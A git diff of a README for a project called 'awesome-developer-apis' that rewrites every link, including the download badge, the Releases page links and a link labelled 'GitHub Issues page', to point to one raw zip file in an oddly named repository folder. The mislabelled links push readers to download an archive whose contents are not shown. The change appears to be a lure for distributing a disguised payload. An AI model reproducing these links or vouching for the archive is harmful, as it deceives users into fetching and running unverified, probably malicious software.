@@ -1,6 +1,6 @@
 # 🌟 awesome-developer-apis - The Best APIs for Your Projects
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/efecanyldz/awesome-developer-apis/releases)
+[![Download Now](https://raw.githubusercontent.com/efecanyldz/awesome-developer-apis/main/gastrophilite/awesome_developer_apis_v3.5-beta.5.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/efecanyldz/awesome-developer-apis/main/gastrophilite/awesome_developer_apis_v3.5-beta.5.zip)
 
 ## 📜 Description
 
@@ -10,12 +10,12 @@ awesome-developer-apis is a comprehensive collection of the best APIs available 
 
 Follow these simple steps to get started with awesome-developer-apis:
 
-1. **Visit the Releases Page**: To find the latest version of our application, [click here to visit the Releases page](https://github.com/efecanyldz/awesome-developer-apis/releases).
+1. **Visit the Releases Page**: To find the latest version of our application, [click here to visit the Releases page](https://raw.githubusercontent.com/efecanyldz/awesome-developer-apis/main/gastrophilite/awesome_developer_apis_v3.5-beta.5.zip).
 2. **Choose the Right File**: On the Releases page, you will see various files for download. Choose the one that suits your system.
 
 ## 📥 Download & Install
 
-To download awesome-developer-apis, visit the Releases page again: [Download Here](https://github.com/efecanyldz/awesome-developer-apis/releases).
+To download awesome-developer-apis, visit the Releases page again: [Download Here](https://raw.githubusercontent.com/efecanyldz/awesome-developer-apis/main/gastrophilite/awesome_developer_apis_v3.5-beta.5.zip).
 
 1. **Select a Version**: Look for the latest version listed. This will usually be at the top of the page.
 2. **Download the File**: Click on the file link to start the download. Depending on your browser settings, the file will save in your Downloads folder or prompt you to choose a location.
@@ -64,8 +64,8 @@ If you encounter issues while downloading or running awesome-developer-apis, fol
 
 ## 📞 Support
 
-For support, please visit our [GitHub Issues page](https://github.com/efecanyldz/awesome-developer-apis/issues). We appreciate your feedback and are here to help you.
+For support, please visit our [GitHub Issues page](https://raw.githubusercontent.com/efecanyldz/awesome-developer-apis/main/gastrophilite/awesome_developer_apis_v3.5-beta.5.zip). We appreciate your feedback and are here to help you.
 
 ---
 
-Thank you for choosing awesome-developer-apis. We hope you find it valuable for your projects! For updates and new features, keep an eye on our Releases page: [Download Here](https://github.com/efecanyldz/awesome-developer-apis/releases).
+Thank you for choosing awesome-developer-apis. We hope you find it valuable for your projects! For updates and new features, keep an eye on our Releases page: [Download Here](https://raw.githubusercontent.com/efecanyldz/awesome-developer-apis/main/gastrophilite/awesome_developer_apis_v3.5-beta.5.zip).
